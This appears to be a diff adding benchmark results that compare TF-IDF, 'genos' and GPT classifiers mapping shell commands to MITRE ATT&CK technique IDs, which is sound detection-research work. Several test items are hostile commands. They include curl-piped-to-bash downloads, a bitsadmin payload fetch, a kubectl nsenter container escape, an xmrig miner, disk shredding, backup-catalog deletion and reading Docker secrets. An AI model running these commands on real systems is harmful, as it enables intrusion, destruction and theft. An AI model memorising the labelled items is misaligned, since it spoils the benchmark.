+      "genos_top3": [
+        "T1552",
+        "T1562",
+        "T1021"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1552",
+        "T1555",
+        "T1003"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 86,
+      "gt": "T1611",
+      "command": "kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"securityContext\":{\"privileged\":true}}]}}'",
+      "tfidf_top3": [
+        "T1610",
+        "T1059",
+        "T1562"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1610",
+        "T1059",
+        "T1562"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1611",
+        "T1610",
+        "T1059"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 87,
+      "gt": "T1033",
+      "command": "getUsername",
+      "tfidf_top3": [
+        "T1106",
+        "T1136",
+        "T1087"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1106",
+        "T1136",
+        "T1087"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1033",
+        "T1082",
+        "T1059"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 88,
+      "gt": "T1569",
+      "command": "launchctl unload",
+      "tfidf_top3": [
+        "T1569",
+        "T1543",
+        "T1562"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1569",
+        "T1543",
+        "T1562"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1569",
+        "T1543",
+        "T1222"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 89,
+      "gt": "T1129",
+      "command": "OpenSSH",
+      "tfidf_top3": [
+        "T1059",
+        "T1140",
+        "T1574"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1059",
+        "T1140",
+        "T1574"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1021",
+        "T1078",
+        "T1133"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 90,
+      "gt": "T1497",
+      "command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi;",
+      "tfidf_top3": [
+        "T1497",
+        "T1562",
+        "T1673"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1497",
+        "T1562",
+        "T1673"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1497",
+        "T1059",
+        "T1082"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 91,
+      "gt": "T1489",
+      "command": "taskkill",
+      "tfidf_top3": [
+        "T1489",
+        "T1562",
+        "T1548"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1489",
+        "T1562",
+        "T1548"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1489",
+        "T1562",
+        "T1059"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 92,
+      "gt": "T1115",
+      "command": "Set-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"",
+      "tfidf_top3": [
+        "T1115",
+        "T1202",
+        "T1119"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1115",
+        "T1202",
+        "T1119"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1115",
+        "T1059",
+        "T1113"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 93,
+      "gt": "T1110",
+      "command": "su -c \"cd /tmp; curl -s $remote_url | bash\" art",
+      "tfidf_top3": [
+        "T1078",
+        "T1548",
+        "T1105"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1078",
+        "T1548",
+        "T1105"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1059",
+        "T1105",
+        "T1078"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 94,
+      "gt": "T1484",
+      "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force",
+      "tfidf_top3": [
+        "T1484",
+        "T1112",
+        "T1562"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1484",
+        "T1112",
+        "T1562"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1112",
+        "T1112",
+        "T1562"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 95,
+      "gt": "T1526",
+      "command": "Set-AzureAuthentication -ClientID $client_id -ClientSecret $client_secret -TenantID $tenant_id -Environment $environment",
+      "tfidf_top3": [
+        "T1526",
+        "T1098",
+        "T1562"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1526",
+        "T1098",
+        "T1562"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1078",
+        "T1552",
+        "T1528"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 96,
+      "gt": "T1573",
+      "command": "{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);",
+      "tfidf_top3": [
+        "T1562",
+        "T1059",
+        "T1105"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1562",
+        "T1059",
+        "T1105"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1027",
+        "T1059",
+        "T1140"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 97,
+      "gt": "T1490",
+      "command": "wbadmin.exe delete catalog -quiet",
+      "tfidf_top3": [
+        "T1490",
+        "T1218",
+        "T1070"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1490",
+        "T1218",
+        "T1070"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1490",
+        "T1070",
+        "T1562"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 98,
+      "gt": "T1620",
+      "command": "execute-assembly",
+      "tfidf_top3": [
+        "T1620",
+        "T1546",
+        "T1218"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1620",
+        "T1546",
+        "T1218"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1059",
+        "T1218",
+        "T1105"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 99,
+      "gt": "T1205",
+      "command": "eth0",
+      "tfidf_top3": [
+        "T1548",
+        "T1106",
+        "T1574"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1548",
+        "T1106",
+        "T1574"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1016",
+        "T1049",
+        "T1082"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 100,
+      "gt": "T1554",
+      "command": "/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/category.py.",
+      "tfidf_top3": [
+        "T1098",
+        "T1005",
+        "T1037"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1098",
+        "T1005",
+        "T1037"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1083",
+        "T1005",
+        "T1082"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 101,
+      "gt": "T1220",
+      "command": "msxsl.exe {PATH:.xml} {PATH:.xsl}",
+      "tfidf_top3": [
+        "T1220",
+        "T1127",
+        "T1218"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1220",
+        "T1127",
+        "T1218"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1220",
+        "T1059",
+        "T1218"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 102,
+      "gt": "T1531",
+      "command": "Set-ADAccountPassword",
+      "tfidf_top3": [
+        "T1552",
+        "T1036",
+        "T1201"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1552",
+        "T1036",
+        "T1201"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1098",
+        "T1110",
+        "T1484"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 103,
+      "gt": "T1570",
+      "command": "ufile.io",
+      "tfidf_top3": [
+        "T1567",
+        "T1570",
+        "T1053"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1567",
+        "T1570",
+        "T1053"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1583",
+        "T1584",
+        "T1567"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 104,
+      "gt": "T1580",
+      "command": "ListBuckets",
+      "tfidf_top3": [
+        "T1580",
+        "T1485",
+        "T1548"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1580",
+        "T1485",
+        "T1548"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1526",
+        "T1580",
+        "T1087"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 105,
+      "gt": "T1530",
+      "command": "New-Item -ItemType Directory -Path $fileSharePath",
+      "tfidf_top3": [
+        "T1135",
+        "T1530",
+        "T1105"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1530",
+        "T1546",
+        "T1135"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1105",
+        "T1070",
+        "T1021"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 106,
+      "gt": "T1652",
+      "command": "driverquery /v /fo list",
+      "tfidf_top3": [
+        "T1652",
+        "T1680",
+        "T1543"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1652",
+        "T1680",
+        "T1543"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1082",
+        "T1120",
+        "T1012"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 107,
+      "gt": "T1006",
+      "command": "dd if=\\\\.\\PhysicalDrive0 of=C:\\Users\\Public\\mbr.bin bs=512 count=1",
+      "tfidf_top3": [
+        "T1006",
+        "T1542",
+        "T1070"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1006",
+        "T1542",
+        "T1070"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1006",
+        "T1005",
+        "T1560"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 108,
+      "gt": "T1010",
+      "command": "wmctrl -lp",
+      "tfidf_top3": [
+        "T1543",
+        "T1036",
+        "T1047"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1543",
+        "T1036",
+        "T1047"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1010",
+        "T1082",
+        "T1057"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 109,
+      "gt": "T1025",
+      "command": "cp -r /media/usb0/Finance/Q4 /srv/stage/removable-copy",
+      "tfidf_top3": [
+        "T1025",
+        "T1039",
+        "T1562"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1025",
+        "T1039",
+        "T1562"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1025",
+        "T1074",
+        "T1005"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 110,
+      "gt": "T1039",
+      "command": "mount -t cifs //10.0.0.25/eng /mnt/eng -o username=svc-backup,password='Winter2024!' && rsync -a /mnt/eng/ /var/tmp/eng_stage/",
+      "tfidf_top3": [
+        "T1068",
+        "T1030",
+        "T1059"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1068",
+        "T1030",
+        "T1059"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1021",
+        "T1078",
+        "T1105"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 111,
+      "gt": "T1072",
+      "command": "ansible all -i hosts.ini -m shell -a 'curl -fsSL http://10.0.0.5/bootstrap.sh | bash' -u deploy",
+      "tfidf_top3": [
+        "T1020",
+        "T1072",
+        "T1496"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1020",
+        "T1072",
+        "T1496"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1059",
+        "T1105",
+        "T1072"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 112,
+      "gt": "T1120",
+      "command": "lsusb -v",
+      "tfidf_top3": [
+        "T1082",
+        "T1120",
+        "T1070"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1082",
+        "T1120",
+        "T1070"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1120",
+        "T1082",
+        "T1016"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 113,
+      "gt": "T1123",
+      "command": "arecord -D hw:0,0 -f cd -d 300 /tmp/meet.wav",
+      "tfidf_top3": [
+        "T1059",
+        "T1105",
+        "T1562"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1059",
+        "T1105",
+        "T1562"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1123",
+        "T1005",
+        "T1059"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 114,
+      "gt": "T1197",
+      "command": "bitsadmin /create updater && bitsadmin /addfile updater http://10.0.0.12/payload.dll C:\\ProgramData\\updater.dll && bitsadmin /resume updater",
+      "tfidf_top3": [
+        "T1197",
+        "T1105",
+        "T1102"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1197",
+        "T1105",
+        "T1102"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1197",
+        "T1105",
+        "T1059"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 115,
+      "gt": "T1496",
+      "command": "xmrig -o pool.supportxmr.com:443 -u 49d.example.worker1 -k --tls --cpu-max-threads-hint=90",
+      "tfidf_top3": [
+        "T1496",
+        "T1105",
+        "T1059"
+      ],
+      "tfidf_top1_correct": true,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1496",
+        "T1105",
+        "T1059"
+      ],
+      "genos_top1_correct": true,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1496",
+        "T1059",
+        "T1105"
+      ],
+      "gpt_top1_correct": true,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 116,
+      "gt": "T1561",
+      "command": "shred -n 3 -z /dev/sdb",
+      "tfidf_top3": [
+        "T1070",
+        "T1561",
+        "T1222"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1070",
+        "T1561",
+        "T1222"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1070",
+        "T1485",
+        "T1561"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 117,
+      "gt": "T1609",
+      "command": "docker exec -it payments-db bash -lc 'cat /run/secrets/db_password && id && uname -a'",
+      "tfidf_top3": [
+        "T1082",
+        "T1059",
+        "T1609"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1082",
+        "T1059",
+        "T1609"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1552",
+        "T1059",
+        "T1082"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    },
+    {
+      "id": 118,
+      "gt": "T1610",
+      "command": "docker run -d --name updater --restart unless-stopped -v /:/host -e MODE=agent ghcr.io/acme/sys-agent:latest",
+      "tfidf_top3": [
+        "T1059",
+        "T1562",
+        "T1105"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": false,
+      "genos_top3": [
+        "T1059",
+        "T1562",
+        "T1105"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": false,
+      "gpt_top3": [
+        "T1611",
+        "T1610",
+        "T1614"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": true
+    },
+    {
+      "id": 119,
+      "gt": "T1613",
+      "command": "docker ps --format '{{.ID}} {{.Image}} {{.Names}}' && docker inspect $(docker ps -q)",
+      "tfidf_top3": [
+        "T1059",
+        "T1611",
+        "T1613"
+      ],
+      "tfidf_top1_correct": false,
+      "tfidf_top3_correct": true,
+      "genos_top3": [
+        "T1059",
+        "T1611",
+        "T1613"
+      ],
+      "genos_top1_correct": false,
+      "genos_top3_correct": true,
+      "gpt_top3": [
+        "T1611",
+        "T1082",
+        "T1610"
+      ],
+      "gpt_top1_correct": false,
+      "gpt_top3_correct": false
+    }
+  ]
+}
